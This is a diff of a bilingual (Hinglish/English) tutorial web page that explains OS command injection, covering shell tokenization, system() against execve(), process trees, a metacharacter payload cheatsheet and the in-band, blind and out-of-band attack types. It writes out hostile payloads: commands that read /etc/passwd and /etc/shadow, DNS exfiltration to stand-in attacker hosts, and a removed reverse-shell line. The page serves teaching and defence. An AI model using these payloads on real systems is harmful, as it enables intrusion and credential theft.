+              <span class="lang-en">How OS Command Injection Works (Deep Architecture &amp; Syscalls)</span>
             </h2>
           </div>
 
           <p class="panel-body-text">
-            <span class="lang-hi">Operating system shells command strings ko tokens me split karti hain aur metacharacters ke aadhar par unhe sequentially ya conditionally evaluate karti hain. Niche iske 5 distinct execution phases explain kiye gaye hain:</span>
-            <span class="lang-en">Operating system shells tokenize input strings and split execution streams upon encountering shell metacharacters. Inspect the 5 technical lifecycle phases below:</span>
+            <span class="lang-hi">Operating system shells kisi bhi string ko seedha execute nahi karti. Wo pehle text ko lexical analysis (tokenization) ke zariye break karti hain, operators dhundti hain, aur kernel syscalls trigger karti hain. Niche iska end-to-end architectural lifecycle aur deep process breakdown explain kiya gaya hai:</span>
+            <span class="lang-en">Operating system shells never execute raw strings directly without tokenization. They tokenize command lines, evaluate control metacharacters, split arguments, and dispatch low-level kernel syscalls. Examine the end-to-end execution lifecycle below:</span>
           </p>
 
-          <!-- Visual Architecture Flow Box -->
-          <div class="arch-flow-box">
+          <!-- Step-by-Step Visual Architecture Flow Box -->
+          <div class="arch-flow-box" style="margin-bottom:2rem;">
             <div class="arch-step-grid">
               <div class="arch-node">
                 <div style="font-size: 1.4rem;">🌐</div>
-                <div class="arch-node-title">1. HTTP Request</div>
-                <div class="arch-node-desc">Attacker sends JSON: <code>{"host": "8.8.8.8; id"}</code></div>
+                <div class="arch-node-title">1. HTTP Ingestion</div>
+                <div class="arch-node-desc">JSON payload parsed: <code>{"host": "8.8.8.8; id"}</code></div>
+              </div>
+              <div class="arch-node danger-node">
+                <div style="font-size: 1.4rem;">🧵</div>
+                <div class="arch-node-title">2. String Concatenation</div>
+                <div class="arch-node-desc">Controller formats template: <code>f"ping -c 2 {host}"</code></div>
               </div>
               <div class="arch-node danger-node">
                 <div style="font-size: 1.4rem;">⚙️</div>
-                <div class="arch-node-title">2. Shell Invocation</div>
-                <div class="arch-node-desc">API passes raw string into <code>/bin/sh -c "..."</code></div>
+                <div class="arch-node-title">3. Shell Lexer Tokenize</div>
+                <div class="arch-node-desc"><code>/bin/sh -c</code> encounters <code>;</code> delimiter &amp; splits streams</div>
               </div>
               <div class="arch-node danger-node">
                 <div style="font-size: 1.4rem;">🔀</div>
-                <div class="arch-node-title">3. Stream Split</div>
-                <div class="arch-node-desc">Semicolon terminates ping, immediately launches <code>id</code></div>
+                <div class="arch-node-title">4. Kernel fork() &amp; execve()</div>
+                <div class="arch-node-desc">Kernel spawns child PID executing injected <code>id</code> binary</div>
               </div>
               <div class="arch-node target-node">
                 <div style="font-size: 1.4rem;">🚨</div>
-                <div class="arch-node-title">4. RCE Takeover</div>
-                <div class="arch-node-desc">Root UID returned in HTTP response to attacker</div>
+                <div class="arch-node-title">5. Root RCE Reflection</div>
+                <div class="arch-node-desc">Stdout captured and returned to attacker in HTTP JSON response</div>
               </div>
             </div>
           </div>
 
-          <!-- 5 Lifecycle Phases -->
-          <div style="margin-top: 1.4rem;">
-            <!-- Phase 1 -->
-            <div class="lifecycle-phase-box" style="border-left: 4px solid #0284c7;">
-              <h4 style="color: #38bdf8;">
-                <span>🔹</span> 1. Unvalidated Input Deserialization &amp; String Interpolation
-              </h4>
-              <div class="def-lead-text">
-                <span class="lang-hi">Client HTTP POST request se parameter supply karta hai. Controller bina kisi validation ke string concatenation ya f-string use karke raw CLI command string prepare karta hai (e.g. <code>f"ping -c 2 {host}"</code>).</span>
-                <span class="lang-en">The client supplies a parameter via HTTP request. The backend controller interpolates the unvalidated string directly into an operating system command template (e.g. <code>f"ping -c 2 {host}"</code>).</span>
-              </div>
+          <!-- Deep Syscall Architecture: system() vs execve() -->
+          <div class="def-lead-card" style="margin-bottom:1.8rem; border-left:4px solid #ef4444;">
+            <div class="def-lead-title" style="color:#f87171;">
+              <span>⚡</span>
+              <span class="lang-hi">Kernel Syscall Mechanics: POSIX system() vs execve()</span>
+              <span class="lang-en">Kernel Syscall Mechanics: POSIX system() vs execve()</span>
+            </div>
+            <div class="def-lead-text">
+              <span class="lang-hi">
+                Command Injection ki poori vulnerability C runtime library aur Linux kernel ke do contrasting execution primitives ke beech ka farq samajhne se clear ho jati hai:
+              </span>
+              <span class="lang-en">
+                The entire vulnerability hinges upon the fundamental architectural contrast between two low-level C runtime execution primitives:
+              </span>
             </div>
 
-            <!-- Phase 2 -->
-            <div class="lifecycle-phase-box" style="border-left: 4px solid #f59e0b;">
-              <h4 style="color: #fbbf24;">
-                <span>⚡</span> 2. Shell Lexer &amp; Metacharacter Tokenization
-              </h4>
-              <div class="def-lead-text">
-                <span class="lang-hi">Jab backend process <code>/bin/sh -c</code> ya <code>cmd.exe /c</code> call karta hai, shell lexer string ko tokenize karta hai. Agar string me <code>;</code>, <code>&&</code>, <code>|</code>, ya <code>$()</code> shamil hain, shell unhe argument nahi balki execution boundaries maanta hai.</span>
-                <span class="lang-en">When the process invokes <code>/bin/sh -c</code> or <code>cmd.exe /c</code>, the shell lexer tokenizes the command line. Characters such as <code>;</code>, <code>&&</code>, <code>|</code>, or <code>$()</code> are interpreted as control operators rather than literal string arguments.</span>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:1.2rem; margin-top:1.2rem;">
+              <!-- Vulnerable Pattern Box -->
+              <div style="background:rgba(239, 68, 68, 0.08); border:1px solid rgba(239, 68, 68, 0.28); border-radius:8px; padding:14px;">
+                <div style="color:#f87171; font-weight:700; font-size:0.92rem; margin-bottom:8px; display:flex; align-items:center; gap:6px;">
+                  <span>❌</span> Vulnerable: C system() / shell=True
+                </div>
+                <div style="font-size:0.82rem; color:#cbd5e1; line-height:1.6;">
+                  <span class="lang-hi">
+                    Jab backend <code>system("ping " + host)</code> ya <code>subprocess.Popen(..., shell=True)</code> call karta hai, OS kernel seedha <code>ping</code> ko nahi chalata! Wo pehle ek <strong>Shell Interpreter process</strong> spawn karta hai:<br>
+                    <code style="color:#f87171; display:block; margin:6px 0;">/bin/sh -c "ping -c 2 8.8.8.8; whoami"</code>
+                    Shell ka lexer string ko tokenize karta hai. Semicolon ko command terminator maan kar do alag-alag commands execute kar deta hai!
+                  </span>
+                  <span class="lang-en">
+                    When invoking <code>system("ping " + host)</code> or <code>subprocess.Popen(..., shell=True)</code>, the kernel does NOT spawn the binary directly! It spawns an intermediate shell process:<br>
+                    <code style="color:#f87171; display:block; margin:6px 0;">/bin/sh -c "ping -c 2 8.8.8.8; whoami"</code>
+                    The shell lexer evaluates semicolons as statement delimiters, spawning arbitrary secondary commands.
+                  </span>
+                </div>
               </div>
-            </div>
 
-            <!-- Phase 3 -->
-            <div class="lifecycle-phase-box" style="border-left: 4px solid #ef4444;">
-              <h4 style="color: #f87171;">
-                <span>🚨</span> 3. Subprocess Forking &amp; Privilege Execution
-              </h4>
-              <div class="def-lead-text">
-                <span class="lang-hi">OS kernel <code>fork()</code> aur <code>execve()</code> syscalls trigger karta hai. Injected command (jaise <code>whoami</code> ya <code>cat /etc/passwd</code>) usi process context aur permissions (root / www-data) ke sath execute hoti hai jisme API server chal raha hai.</span>
-                <span class="lang-en">The kernel invokes <code>fork()</code> and <code>execve()</code>. The injected command runs with the full OS security context and permissions of the hosting application worker (often root or www-data).</span>
-              </div>
-            </div>
-
-            <!-- Phase 4 -->
-            <div class="lifecycle-phase-box" style="border-left: 4px solid #a855f7;">
-              <h4 style="color: #c084fc;">
-                <span>🌐</span> 4. Output Redirection &amp; Stream Transmission (In-Band / Blind / OOB)
-              </h4>
-              <div class="def-lead-text">
-                <span class="lang-hi">Agar application command stdout capture karti hai, data direct API response me return hota hai (In-Band). Agar output suppressed hai, attacker time delay (<code>; sleep 10</code>) ya DNS/HTTP out-of-band requests trigger karke data exfiltrate karta hai.</span>
-                <span class="lang-en">If the application captures standard output, the result returns inside the HTTP response (In-Band). If suppressed, attackers observe execution timing via time delays (<code>; sleep 10</code>) or issue Out-of-Band network calls to external listener servers.</span>
-              </div>
-            </div>
-
-            <!-- Phase 5 -->
-            <div class="lifecycle-phase-box" style="border-left: 4px solid #10b981;">
-              <h4 style="color: #34d399;">
-                <span>💎</span> 5. Reverse Shell Attachment &amp; Lateral Movement
-              </h4>
-              <div class="def-lead-text">
-                <span class="lang-hi">Attacker interactive reverse shell spawn karta hai (<code>bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</code>), cloud metadata credentials (AWS IMDS / GCP metadata) read karta hai aur poore cloud network me laterally move kar jata hai.</span>
-                <span class="lang-en">Adversaries spawn interactive reverse TCP shells, scrape instance metadata service credentials (AWS IMDS / GCP metadata), and pivot across the internal cloud infrastructure.</span>
+              <!-- Secure Pattern Box -->
+              <div style="background:rgba(16, 185, 129, 0.08); border:1px solid rgba(16, 185, 129, 0.28); border-radius:8px; padding:14px;">
+                <div style="color:#34d399; font-weight:700; font-size:0.92rem; margin-bottom:8px; display:flex; align-items:center; gap:6px;">
+                  <span>✅</span> Immune: Kernel execve() / shell=False
+                </div>
+                <div style="font-size:0.82rem; color:#cbd5e1; line-height:1.6;">
+                  <span class="lang-hi">
+                    Jab backend <code>subprocess.run(['ping', '-c', '2', host], shell=False)</code> call karta hai, C standard library direct Linux kernel syscall invoke karti hai:<br>
+                    <code style="color:#34d399; display:block; margin:6px 0;">execve("/bin/ping", ["ping", "-c", "2", "8.8.8.8; whoami"], envp)</code>
+                    Yahan koi shell exist hi nahi karta! Poora string <code>"8.8.8.8; whoami"</code> ek single isolated argument banta hai. Ping utility DNS lookup fail karegi, lekin zero command execute hogi!
+                  </span>
+                  <span class="lang-en">
+                    When passing an argument vector without a shell (<code>shell=False</code>), the runtime issues the POSIX kernel system call directly:<br>
+                    <code style="color:#34d399; display:block; margin:6px 0;">execve("/bin/ping", ["ping", "-c", "2", "8.8.8.8; whoami"], envp)</code>
+                    No intermediate shell exists! The entire string is treated as a single parameter element. Ping reports an invalid hostname, completely neutralizing execution!
+                  </span>
+                </div>
               </div>
             </div>
           </div>
 
-          <!-- Shell Metacharacters Cheatsheet Table -->
-          <div style="margin-top:1.6rem; overflow-x:auto;">
-            <div class="def-lead-title" style="margin-bottom:0.8rem; font-size:1.05rem;">
+          <!-- Process Tree Breakdown -->
+          <div class="def-lead-card" style="margin-bottom:1.8rem; border-left:4px solid #a855f7;">
+            <div class="def-lead-title" style="color:#c084fc;">
+              <span>🌳</span>
+              <span class="lang-hi">Linux Process Hierarchy Tree (Parent to Injected Child)</span>
+              <span class="lang-en">Linux Process Hierarchy Tree (Parent to Injected Child)</span>
+            </div>
+            <div class="def-lead-text">
+              <span class="lang-hi">
+                Command Injection ke dauran server process table me kya hota hai? Attacker injected payload ke zariye process tree me ek unwanted grandchild process attach kar deta hai:
+              </span>
+              <span class="lang-en">
+                What does the operating system process table look like during an active command injection exploit? The attacker attaches a rogue grandchild process to the tree:
+              </span>
+            </div>
+            
+            <div style="background:#070e1e; border:1px solid rgba(168, 85, 247, 0.25); border-radius:8px; padding:14px; margin-top:1rem; font-family:var(--font-mono); font-size:0.82rem; line-height:1.7; color:#e2e8f0;">
+              <span style="color:#94a3b8;">PID 1</span> [systemd / init]<br>
+              &nbsp;&nbsp;└── <span style="color:#38bdf8;">PID 142</span> [gunicorn / node / uwsgi] (Runs API Server)<br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── <span style="color:#fbbf24;">PID 143</span> [/bin/sh -c "ping -c 2 8.8.8.8; whoami"] (Vulnerable Intermediate Shell)<br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├── <span style="color:#94a3b8;">PID 144</span> [/bin/ping -c 2 8.8.8.8] (Primary Process: Finishes/Exits)<br>
+              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── <span style="color:#f87171; font-weight:700;">PID 145 [/usr/bin/whoami] (INJECTED ADVERSARY PROCESS — Executed as root/www-data!)</span>
+            </div>
+          </div>
+
+          <!-- Comprehensive Shell Metacharacters Cheatsheet Table -->
+          <div style="margin-top:1.8rem; margin-bottom:1.8rem;">
+            <div class="def-lead-title" style="margin-bottom:0.8rem; font-size:1.05rem; color:#38bdf8;">
               <span>🛠️</span>
-              <span class="lang-hi">Shell Metacharacters &amp; Chaining Operators Cheatsheet</span>
-              <span class="lang-en">Shell Metacharacters &amp; Chaining Operators Cheatsheet</span>
+              <span class="lang-hi">Cross-Platform Shell Delimiters &amp; Metacharacters Matrix</span>
+              <span class="lang-en">Cross-Platform Shell Delimiters &amp; Metacharacters Matrix</span>
             </div>
-            <table style="width:100%; border-collapse:collapse; font-size:0.92rem; color:#f1f5f9;">
-              <thead>
-                <tr style="background:rgba(255,255,255,0.06); border-bottom:1px solid rgba(255,255,255,0.12);">
-                  <th style="padding:10px 14px; text-align:left; color:#38bdf8;">Operator</th>
-                  <th style="padding:10px 14px; text-align:left; color:#fbbf24;">Description</th>
-                  <th style="padding:10px 14px; text-align:left; color:#f87171;">Sample Exploit Payload</th>
-                  <th style="padding:10px 14px; text-align:left; color:#34d399;">Operating System</th>
-                </tr>
-              </thead>
-              <tbody>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">;</td>
-                  <td style="padding:10px 14px;">Sequential delimiter; runs second command unconditionally.</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">8.8.8.8; id</td>
-                  <td style="padding:10px 14px;">Linux / Unix / Bash</td>
-                </tr>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">&&</td>
-                  <td style="padding:10px 14px;">Logical AND; runs second command only if first succeeds.</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">8.8.8.8 && whoami</td>
-                  <td style="padding:10px 14px;">Linux &amp; Windows</td>
-                </tr>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">|</td>
-                  <td style="padding:10px 14px;">Pipe; redirects stdout of first command as stdin to second.</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">8.8.8.8 | cat /etc/passwd</td>
-                  <td style="padding:10px 14px;">Linux &amp; Windows</td>
-                </tr>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">||</td>
-                  <td style="padding:10px 14px;">Logical OR; runs second command if first command fails.</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">invalid_host || id</td>
-                  <td style="padding:10px 14px;">Linux &amp; Windows</td>
-                </tr>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">$() / `...`</td>
-                  <td style="padding:10px 14px;">Command substitution; evaluates inner command inline.</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">$(whoami).evil.com</td>
-                  <td style="padding:10px 14px;">Linux / Unix / Bash</td>
-                </tr>
-                <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
-                  <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">${IFS} / \n</td>
-                  <td style="padding:10px 14px;">Internal Field Separator / Newline (bypasses space filters).</td>
-                  <td style="padding:10px 14px; font-family:var(--font-mono);">cat${IFS}/etc/passwd</td>
-                  <td style="padding:10px 14px;">Linux / Unix / Bash</td>
-                </tr>
-              </tbody>
-            </table>
+            <div style="overflow-x:auto;">
+              <table style="width:100%; border-collapse:collapse; font-size:0.88rem; color:#f1f5f9;">
+                <thead>
+                  <tr style="background:rgba(255,255,255,0.06); border-bottom:1px solid rgba(255,255,255,0.12);">
+                    <th style="padding:10px 14px; text-align:left; color:#38bdf8;">Delimiter</th>
+                    <th style="padding:10px 14px; text-align:left; color:#fbbf24;">Execution Mechanism</th>
+                    <th style="padding:10px 14px; text-align:left; color:#f87171;">Sample Exploit Payload</th>
+                    <th style="padding:10px 14px; text-align:left; color:#34d399;">Supported Environment</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">;</td>
+                    <td style="padding:10px 14px;">Sequential terminator. Pehla command chahe fail ho ya pass, doosra command unconditional execute hota hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">8.8.8.8; id</td>
+                    <td style="padding:10px 14px;">Linux / Unix (bash, sh, zsh)</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">&amp;&amp;</td>
+                    <td style="padding:10px 14px;">Logical AND. Second command tabhi execute hota hai jab first command exit status code 0 (success) return kare.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">8.8.8.8 &amp;&amp; whoami</td>
+                    <td style="padding:10px 14px;">Linux, macOS &amp; Windows (cmd.exe)</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">||</td>
+                    <td style="padding:10px 14px;">Logical OR. Second command tab execute hota hai jab first command fail ho (exit code != 0). Attacker invalid host dekar isse trigger karta hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">invalid.host || id</td>
+                    <td style="padding:10px 14px;">Linux, macOS &amp; Windows (cmd.exe)</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">|</td>
+                    <td style="padding:10px 14px;">Pipeline redirection. First command ka standard output (stdout) direct second command ke standard input (stdin) me feed hota hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">8.8.8.8 | cat /etc/passwd</td>
+                    <td style="padding:10px 14px;">Linux, macOS &amp; Windows</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">$() / `...`</td>
+                    <td style="padding:10px 14px;">POSIX Subshell Command Substitution. Shell inner command ko execute karke uska result command line argument me replace karti hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">ping $(whoami).attacker.com</td>
+                    <td style="padding:10px 14px;">Linux / Unix / Bash</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">
+ (0x0A)</td>
+                    <td style="padding:10px 14px;">Line Feed / Newline character. Semicolon ki tarah newline character shell ko command boundary inform karta hai. URL encoded as <code>%0a</code>.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">8.8.8.8%0aid</td>
+                    <td style="padding:10px 14px;">Linux &amp; Windows</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">&gt; / &gt;&gt;</td>
+                    <td style="padding:10px 14px;">Output file redirection. Server ke filesystem me arbitrary web shell ya cron jobs write karne ke liye use hota hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">; echo "pwn" &gt; /app/static/r.txt</td>
+                    <td style="padding:10px 14px;">All Operating Systems</td>
+                  </tr>
+                  <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#f87171; font-weight:700;">${IFS}</td>
+                    <td style="padding:10px 14px;">Internal Field Separator. Agar API space character (<code>0x20</code>) block karti hai, toh <code>$IFS</code> bash me space ka replacement ban jata hai.</td>
+                    <td style="padding:10px 14px; font-family:var(--font-mono); color:#fca5a5;">;cat$IFS/etc/shadow</td>
+                    <td style="padding:10px 14px;">Linux / Unix / Bash</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Section E: The 3 Core Exploit Paradigms -->
+          <div style="margin-top:2rem;">
+            <div class="def-lead-title" style="margin-bottom:1rem; font-size:1.05rem; color:#38bdf8;">
+              <span>🔬</span>
+              <span class="lang-hi">The 3 Core Exploit Paradigms: In-Band, Blind &amp; Out-of-Band (OOB)</span>
+              <span class="lang-en">The 3 Core Exploit Paradigms: In-Band, Blind &amp; Out-of-Band (OOB)</span>
+            </div>
+
+            <!-- Paradigm 1: In-Band -->
+            <div class="def-lead-card" style="margin-bottom:1.4rem; border-left:4px solid #ef4444;">
+              <div class="def-lead-title" style="color:#f87171;">
+                <span>1️⃣</span> Type A: In-Band (Result-Based) Command Injection
+              </div>
+              <div class="def-lead-text">
+                <span class="lang-hi">
+                  Isme application standard output (<code>stdout</code>) ya standard error (<code>stderr</code>) ko seedha HTTP response me return kar deti hai. Attacker <code>POST /api/v1/ping</code> bhejta hai with <code>8.8.8.8; cat /etc/passwd</code>, aur API response me server ke users ki list direct browser me aa jati hai. Yeh sabse direct aur dangerous category hai.
+                </span>
+                <span class="lang-en">
+                  Occurs when the application captures standard output (<code>stdout</code>) or standard error (<code>stderr</code>) streams from the executed subprocess and serializes it directly into the HTTP response body. Attackers immediately view command outputs within their HTTP client.
+                </span>
+              </div>
+            </div>
+
+            <!-- Paradigm 2: Blind Time-Based -->
+            <div class="def-lead-card" style="margin-bottom:1.4rem; border-left:4px solid #f59e0b;">
+              <div class="def-lead-title" style="color:#fbbf24;">
+                <span>2️⃣</span> Type B: Blind (Time-Based) Command Injection
+              </div>
+              <div class="def-lead-text">
+                <span class="lang-hi">
+                  Jab API response me sirf generic success message (e.g. <code>{"status": "queued"}</code>) deti hai aur CLI output suppress kar leti hai, tab attacker <strong>Time Delay</strong> inject karta hai: <code>; sleep 10</code>. Agar server request ka response exact 10 seconds delay karke lautata hai, toh vulnerability confirm ho jati hai. Attacker conditional sleep use karke bit-by-bit poora database ya password extract kar sakta hai!
+                </span>
+                <span class="lang-en">
+                  When the API suppresses standard streams or returns static status payloads (e.g., <code>{"status": "queued"}</code>), direct observation is impossible. Attackers inject time delay primitives: <code>; sleep 10</code>. If HTTP response latency increases by precisely 10 seconds, command execution is proven. Data is then exfiltrated bit-by-bit using timing thresholds.
+                </span>
+              </div>
+            </div>
+
+            <!-- Paradigm 3: Out-of-Band (OOB) -->
+            <div class="def-lead-card" style="margin-bottom:1.4rem; border-left:4px solid #a855f7;">
+              <div class="def-lead-title" style="color:#c084fc;">
+                <span>3️⃣</span> Type C: Out-of-Band (OOB / DNS Exfiltration)
+              </div>
+              <div class="def-lead-text">
+                <span class="lang-hi">
+                  Agar inbound HTTP traffic me response delay measure karna possible na ho (e.g. asynchronous celery workers), toh attacker <strong>Out-of-Band DNS Queries</strong> trigger karta hai: <code>; nslookup $(whoami).attacker-server.com</code>. Backend server command execute karega, <code>whoami</code> resolve karega (e.g. <code>root</code>), aur attacker ke authoritative DNS server par <code>root.attacker-server.com</code> ki lookup query send karega! Attacker apne DNS logs me data read kar leta hai!
+                </span>
+                <span class="lang-en">
+                  If backend execution is fully decoupled from the HTTP response pipeline (e.g. async Celery workers), attackers trigger outbound network interactions. Injecting <code>; nslookup $(whoami).attacker-server.com</code> forces the host resolver to query the adversary's authoritative nameserver, exfiltrating the username in the requested subdomain!
+                </span>
+              </div>
+            </div>
           </div>
 
         </div>
